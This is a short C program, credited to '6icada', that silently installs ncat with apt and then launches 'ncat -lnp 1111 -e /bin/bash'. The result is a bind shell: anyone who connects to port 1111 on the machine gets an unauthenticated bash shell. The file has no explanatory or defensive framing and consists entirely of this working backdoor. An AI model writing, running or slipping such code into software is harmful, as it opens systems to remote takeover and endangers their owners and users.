//Code by 6icada
//Please do not copy code

//Adding libraries
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

//Main function
int main(){
  //Adding vars
  char cmd[150];
  const int MainPort = 1111;

  //Installing tools
  //system("apt update > /dev/null");
  //system("apt upgrade > /dev/null");
  system("apt install ncat > /dev/null");

  //Starting Action
  sprintf(cmd, "ncat -lnp %d -e /bin/bash", MainPort);
  system(cmd);
}
